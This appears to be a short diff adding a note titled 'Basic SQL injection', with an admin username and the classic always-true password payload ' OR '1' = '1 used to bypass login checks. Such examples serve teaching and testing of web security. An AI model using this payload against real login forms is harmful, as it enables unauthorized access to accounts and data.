@@ -1,0 +1,4 @@
+Basic SQL injection
+
+username: admin
+password: ' OR '1' = '1
